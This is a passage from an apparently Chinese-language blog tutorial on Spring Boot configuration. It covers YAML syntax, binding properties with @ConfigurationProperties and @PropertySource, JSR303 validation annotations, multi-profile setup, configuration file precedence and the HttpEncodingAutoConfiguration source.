class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SpringApplication.run(Springboot01HelloworldApplication.class, args);<br></code></pre></td></tr></table></figure><h1 id="3、SpringBoot-配置"><a href="#3、SpringBoot-配置" class="headerlink" title="3、SpringBoot 配置"></a>3、SpringBoot 配置</h1><p><font style="color:rgba(0, 0, 0, 0.9);">SpringBoot使用一个全局的配置文件 ， 配置文件名称是固定的</font></p><ul><li><font style="color:rgba(0, 0, 0, 0.9);">application.properties</font><ul><li><font style="color:rgba(0, 0, 0, 0.9);">语法结构 ：key&#x3D;value</font></li></ul></li><li><font style="color:rgba(0, 0, 0, 0.9);">application.yml</font><ul><li><font style="color:rgba(0, 0, 0, 0.9);">语法结构 ：key：空格 value</font></li></ul></li></ul><p><strong><font style="color:rgba(0, 0, 0, 0.9);">配置文件的作用 ：</font></strong><font style="color:rgba(0, 0, 0, 0.9);">修改SpringBoot自动配置的默认值，因为SpringBoot在底层都给我们自动配置好了；</font></p><h2 id="yaml概述"><a href="#yaml概述" class="headerlink" title="yaml概述"></a>yaml概述</h2><p><a href="https://www.ruanyifeng.com/blog/2016/07/yaml.html">YAML 语言教程 - 阮一峰的网络日志</a></p><h2 id="yaml-语法"><a href="#yaml-语法" class="headerlink" title="yaml 语法"></a>yaml 语法</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 普通的 key-value</span><br><span class="hljs-attr">name:</span> <span class="hljs-string">qwe</span><br><br><span class="hljs-comment"># 对象</span><br><span class="hljs-attr">student:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">qwe</span><br>  <span class="hljs-attr">age:</span> <span class="hljs-number">11</span><br><br><span class="hljs-attr">student:</span> &#123;<span class="hljs-attr">name:</span> <span class="hljs-string">qwe</span>, <span class="hljs-attr">age:</span> <span class="hljs-number">1</span>&#125;<br><br><span class="hljs-comment"># 数组</span><br><span class="hljs-attr">pets:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">cat</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">dog</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">pig</span><br><br><span class="hljs-attr">pets:</span> [<span class="hljs-string">cat</span>,<span class="hljs-string">dog</span>,<span class="hljs-string">pig</span>]<br></code></pre></td></tr></table></figure><h2 id="yaml注入配置文件"><a href="#yaml注入配置文件" class="headerlink" title="yaml注入配置文件"></a>yaml注入配置文件</h2><p>**@ConfigurationProperties **作用：将配置文件中配置的每一个属性的值，映射到这个组件中；告诉 SpringBoot 将本类中的所有属性和配置文件中相关的配置进行绑定参数 <strong>prefix &#x3D; “person”</strong> : 将配置文件中的person下面的所有属性一一对应</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;person&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> Boolean happy;<br>    <span class="hljs-keyword">private</span> Date birth;<br>    <span class="hljs-keyword">private</span> Map&lt;String,Object&gt; maps;<br>    <span class="hljs-keyword">private</span> List&lt;Object&gt; lists;<br>    <span class="hljs-keyword">private</span> Dog dog;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;&#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age, Date birth, Boolean happy, List&lt;Object&gt; lists, Map&lt;String, Object&gt; maps, Dog dog)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.birth = birth;<br>        <span class="hljs-built_in">this</span>.happy = happy;<br>        <span class="hljs-built_in">this</span>.lists = lists;<br>        <span class="hljs-built_in">this</span>.maps = maps;<br>        <span class="hljs-built_in">this</span>.dog = dog;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Boolean <span class="hljs-title function_">getHappy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> happy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHappy</span><span class="hljs-params">(Boolean happy)</span> &#123;<br>        <span class="hljs-built_in">this</span>.happy = happy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Date <span class="hljs-title function_">getBirth</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> birth;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBirth</span><span class="hljs-params">(Date birth)</span> &#123;<br>        <span class="hljs-built_in">this</span>.birth = birth;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">getMaps</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> maps;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMaps</span><span class="hljs-params">(Map&lt;String, Object&gt; maps)</span> &#123;<br>        <span class="hljs-built_in">this</span>.maps = maps;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> List&lt;Object&gt; <span class="hljs-title function_">getLists</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> lists;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLists</span><span class="hljs-params">(List&lt;Object&gt; lists)</span> &#123;<br>        <span class="hljs-built_in">this</span>.lists = lists;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Dog <span class="hljs-title function_">getDog</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> dog;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDog</span><span class="hljs-params">(Dog dog)</span> &#123;<br>        <span class="hljs-built_in">this</span>.dog = dog;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>        <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>        <span class="hljs-string">&quot;, happy=&quot;</span> + happy +<br>        <span class="hljs-string">&quot;, birth=&quot;</span> + birth +<br>        <span class="hljs-string">&quot;, maps=&quot;</span> + maps +<br>        <span class="hljs-string">&quot;, lists=&quot;</span> + lists +<br>        <span class="hljs-string">&quot;, dog=&quot;</span> + dog +<br>        <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8123</span><br><br><span class="hljs-attr">person:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">qwe</span><br>  <span class="hljs-attr">age:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">happy:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">birth:</span> <span class="hljs-string">&quot;1009/09/08&quot;</span><br>  <span class="hljs-attr">maps:</span><br>    <span class="hljs-attr">k1:</span> <span class="hljs-string">v1</span><br>    <span class="hljs-attr">k2:</span> <span class="hljs-string">v2</span><br>  <span class="hljs-attr">lists:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">code</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">music</span><br>  <span class="hljs-attr">dog:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">wang</span><br>    <span class="hljs-attr">age:</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang;<br><br><span class="hljs-keyword">import</span> com.kuang.pojo.Person;<br><span class="hljs-keyword">import</span> org.junit.jupiter.api.Test;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.boot.test.context.SpringBootTest;<br><br><span class="hljs-meta">@SpringBootTest</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Springboot01HelloworldApplicationTests</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> Person person;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextLoads</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(person);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>Person{name&#x3D;’qwe’, age&#x3D;1, happy&#x3D;false, birth&#x3D;Thu Sep 08 00:00:00 CST 1009, maps&#x3D;{k1&#x3D;v1, k2&#x3D;v2}, lists&#x3D;[code, music], dog&#x3D;Dog{name&#x3D;’wang’, age&#x3D;1}}</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304357.png"></p><h2 id="加载指定的配置文件"><a href="#加载指定的配置文件" class="headerlink" title="加载指定的配置文件"></a>加载指定的配置文件</h2><p><strong><font style="color:rgba(0, 0, 0, 0.9);">@PropertySource ：</font></strong><font style="color:rgba(0, 0, 0, 0.9);">加载指定的配置文件；</font></p><p><strong><font style="color:rgba(0, 0, 0, 0.9);">@configurationProperties</font></strong><font style="color:rgba(0, 0, 0, 0.9);">：默认从全局配置文件中获取值；</font></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">name</span>=<span class="hljs-string">qaz</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//指定加载 person.properties文件</span><br><span class="hljs-meta">@PropertySource(value = &quot;classpath:person.properties&quot;)</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-comment">//@ConfigurationProperties(prefix = &quot;person&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br><br>    <span class="hljs-meta">@Value(&quot;$&#123;name&#125;&quot;)</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> Boolean happy;<br>    <span class="hljs-keyword">private</span> Date birth;<br>    <span class="hljs-keyword">private</span> Map&lt;String,Object&gt; maps;<br>    <span class="hljs-keyword">private</span> List&lt;Object&gt; lists;<br>    <span class="hljs-keyword">private</span> Dog dog;<br></code></pre></td></tr></table></figure><hr><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304970.png"></p><h2 id="配置文件占位符"><a href="#配置文件占位符" class="headerlink" title="配置文件占位符"></a>配置文件占位符</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">person:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">qwe$&#123;random.uuid&#125;</span> <span class="hljs-comment"># 随机uuid</span><br>    <span class="hljs-attr">age:</span> <span class="hljs-string">$&#123;random.int&#125;</span>  <span class="hljs-comment"># 随机int</span><br>    <span class="hljs-attr">happy:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">birth:</span> <span class="hljs-number">2000</span><span class="hljs-string">/01/01</span><br>    <span class="hljs-attr">maps:</span> &#123;<span class="hljs-attr">k1:</span> <span class="hljs-string">v1</span>,<span class="hljs-attr">k2:</span> <span class="hljs-string">v2</span>&#125;<br>    <span class="hljs-attr">lists:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">code</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">music</span><br>    <span class="hljs-attr">dog:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">$&#123;person.hello:other&#125;_旺财</span><br>      <span class="hljs-attr">age:</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304522.png"></p><h3 id="小结：-1"><a href="#小结：-1" class="headerlink" title="小结："></a>小结：</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304628.webp"></p><p><font style="color:rgba(0, 0, 0, 0.9);">JSR303数据校验 ， 可以在字段是增加一层过滤器验证 ， 可以保证数据的合法性</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">松散绑定：yml 中写的 last-name 和 lastName是一样的</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">复杂类型封装，yml中可以封装对象 ， 使用value就不支持</font></p><h2 id="JSR303数据校验"><a href="#JSR303数据校验" class="headerlink" title="JSR303数据校验"></a>JSR303数据校验</h2><p><font style="color:rgba(0, 0, 0, 0.9);">字段是增加一层过滤器验证 ， 可以保证数据的合法性</font></p><p>常见参数：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">@NotNull(message=&quot;名字不能为空&quot;)</span><br><span class="hljs-string">private</span> <span class="hljs-string">String</span> <span class="hljs-string">userName;</span><br><span class="hljs-string">@Max(value=120,message=&quot;年龄最大不能查过120&quot;)</span><br><span class="hljs-string">private</span> <span class="hljs-string">int</span> <span class="hljs-string">age;</span><br><span class="hljs-string">@Email(message=&quot;邮箱格式错误&quot;)</span><br><span class="hljs-string">private</span> <span class="hljs-string">String</span> <span class="hljs-string">email;</span><br><br><span class="hljs-comment">#空检查</span><br><span class="hljs-string">@Null</span>       <span class="hljs-comment">#验证对象是否为null</span><br><span class="hljs-string">@NotNull</span>    <span class="hljs-comment">#验证对象是否不为null, 无法查检长度为0的字符串</span><br><span class="hljs-string">@NotBlank</span>   <span class="hljs-comment">#检查约束字符串是不是Null还有被Trim的长度是否大于0,只对字符串,且会去掉前后空格.</span><br><span class="hljs-string">@NotEmpty</span>   <span class="hljs-comment">#检查约束元素是否为NULL或者是EMPTY.</span><br>    <br><span class="hljs-comment">#Booelan检查</span><br><span class="hljs-string">@AssertTrue</span>     <span class="hljs-comment">#验证 Boolean 对象是否为 true  </span><br><span class="hljs-string">@AssertFalse</span>    <span class="hljs-comment">#验证 Boolean 对象是否为 false  </span><br>    <br><span class="hljs-comment">#长度检查</span><br><span class="hljs-string">@Size(min=,</span> <span class="hljs-string">max=)</span> <span class="hljs-comment">#验证对象（Array,Collection,Map,String）长度是否在给定的范围之内  </span><br><span class="hljs-string">@Length(min=,</span> <span class="hljs-string">max=)</span> <span class="hljs-string">string</span> <span class="hljs-string">is</span> <span class="hljs-string">between</span> <span class="hljs-string">min</span> <span class="hljs-string">and</span> <span class="hljs-string">max</span> <span class="hljs-string">included.</span><br><br><span class="hljs-comment">#日期检查</span><br><span class="hljs-string">@Past</span>       <span class="hljs-comment">#验证 Date 和 Calendar 对象是否在当前时间之前  </span><br><span class="hljs-string">@Future</span>     <span class="hljs-comment">#验证 Date 和 Calendar 对象是否在当前时间之后  </span><br><span class="hljs-string">@Pattern</span>    <span class="hljs-comment">#验证 String 对象是否符合正则表达式的规则</span><br></code></pre></td></tr></table></figure><h2 id="多环境切换"><a href="#多环境切换" class="headerlink" title="多环境切换"></a>多环境切换</h2><p><font style="color:rgba(0, 0, 0, 0.9);">profile是Spring对不同环境提供不同配置功能的支持，可以通过激活不同的环境版本，实现快速切换环境；</font></p><h3 id="多配置文件"><a href="#多配置文件" class="headerlink" title="多配置文件"></a>多配置文件</h3><p><font style="color:rgba(0, 0, 0, 0.9);">我们在主配置文件编写的时候，文件名可以是 application-{profile}.properties&#x2F;yml , 用来指定多个环境版本；</font></p><p><strong><font style="color:rgba(0, 0, 0, 0.9);">例如：</font></strong></p><p><font style="color:rgba(0, 0, 0, 0.9);">application-test.properties 代表测试环境配置</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">application-dev.properties 代表开发环境配置</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">但是Springboot并不会直接启动这些配置文件，它</font><strong><font style="color:rgba(0, 0, 0, 0.9);">默认使用application.properties主配置文件</font></strong><font style="color:rgba(0, 0, 0, 0.9);">；</font></p><h3 id="yaml的多文档块"><a href="#yaml的多文档块" class="headerlink" title="yaml的多文档块"></a>yaml的多文档块</h3><p><font style="color:rgba(0, 0, 0, 0.9);">和properties配置文件中一样，但是使用yml去实现不需要创建多个配置文件</font></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">server:</span>  <br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8081</span><br><span class="hljs-comment">#选择要激活那个环境块</span><br><span class="hljs-attr">spring:</span>  <br>  <span class="hljs-attr">profiles:</span>    <br>    <span class="hljs-attr">active:</span> <span class="hljs-string">prod</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">server:</span>  <br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8083</span><br><span class="hljs-attr">spring:</span>  <br>  <span class="hljs-attr">profiles:</span> <span class="hljs-string">dev</span> <span class="hljs-comment">#配置环境的名称</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-attr">server:</span>  <br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8084</span><br><span class="hljs-attr">spring:</span>  <br>  <span class="hljs-attr">profiles:</span> <span class="hljs-string">prod</span>  <span class="hljs-comment">#配置环境的名称</span><br></code></pre></td></tr></table></figure><p><strong><font style="color:rgba(0, 0, 0, 0.9);">注意：如果yml和properties同时都配置了端口，并且没有激活其他环境 ， 默认会使用properties配置文件的！</font></strong></p><h3 id="配置文件加载位置"><a href="#配置文件加载位置" class="headerlink" title="配置文件加载位置"></a>配置文件加载位置</h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">外部加载配置文件的方式十分多，我们选择最常用的即可，在开发的资源文件中进行配置！</font></strong></p><p><font style="color:rgba(0, 0, 0, 0.9);">springboot 启动会扫描以下位置的application.properties或者application.yml文件作为Spring boot的默认配置文件：</font></p><p><font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">优先级1：项目路径下的config文件夹配置文件</font></p><p><font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">优先级2：项目路径下配置文件</font></p><p><font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">优先级3：资源路径下的config文件夹配置文件</font></p><p><font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">优先级4：资源路径下配置文件</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">优先级由高到底，高优先级的配置会覆盖低优先级的配置；</font></p><h2 id="自动配置原理"><a href="#自动配置原理" class="headerlink" title="自动配置原理"></a>自动配置原理</h2><p><strong><font style="color:rgba(0, 0, 0, 0.9);">来到 </font></strong><font style="color:rgba(0, 0, 0, 0.9);">META-INF&#x2F;spring.factories<br></font><font style="color:rgba(0, 0, 0, 0.9);">以其中的 HttpEncodingAutoConfiguration 为例分析</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">spring.http.  在高版本已经弃用</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304953.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//声明这是 spring 配置类</span><br><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-comment">//启用对 ServerProperties 的配置属性绑定，Spring Boot 会把配置文件中 server.* 的属性绑定到 ServerProperties 对象中</span><br><span class="hljs-meta">@EnableConfigurationProperties(ServerProperties.class)</span><br><span class="hljs-comment">//条件注解，表示此配置类 仅在 Web 应用且使用 Servlet 类型时生效</span><br><span class="hljs-meta">@ConditionalOnWebApplication(type = ConditionalOnWebApplication.Type.SERVLET)</span><br><span class="hljs-comment">//表示只有类路径中存在 CharacterEncodingFilter(Spring 提供的过滤器，用于设置请求和响应的字符编码) 时，这个配置才会生效。</span><br><span class="hljs-meta">@ConditionalOnClass(CharacterEncodingFilter.class)</span><br><span class="hljs-comment">//条件注解，用于检查 配置文件中某个属性</span><br><span class="hljs-meta">@ConditionalOnProperty(prefix = &quot;server.servlet.encoding&quot;, value = &quot;enabled&quot;, matchIfMissing = true)</span><br><span class="hljs-comment">//从 ServerProperties 中提取编码配置</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpEncodingAutoConfiguration</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Encoding properties;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HttpEncodingAutoConfiguration</span><span class="hljs-params">(ServerProperties properties)</span> &#123;<br>        <span class="hljs-built_in">this</span>.properties = properties.getServlet().getEncoding();<br>    &#125;<br><br>    <span class="hljs-comment">//声明一个 Spring Bean，返回类型为 CharacterEncodingFilter </span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-meta">@ConditionalOnMissingBean</span><br>    <span class="hljs-keyword">public</span> CharacterEncodingFilter <span class="hljs-title function_">characterEncodingFilter</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">CharacterEncodingFilter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderedCharacterEncodingFilter</span>();<br>        filter.setEncoding(<span class="hljs-built_in">this</span>.properties.getCharset().name());<br>        filter.setForceRequestEncoding(<span class="hljs-built_in">this</span>.properties.shouldForce(Encoding.Type.REQUEST));<br>        filter.setForceResponseEncoding(<span class="hljs-built_in">this</span>.properties.shouldForce(Encoding.Type.RESPONSE));<br>        <span class="hljs-keyword">return</span> filter;<br>    &#125;<br></code></pre></td></tr></table></figure><p>跟进 ServerProperties.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;server&quot;, ignoreUnknownFields = true)</span><br><span class="hljs-keyword">public</span> <span 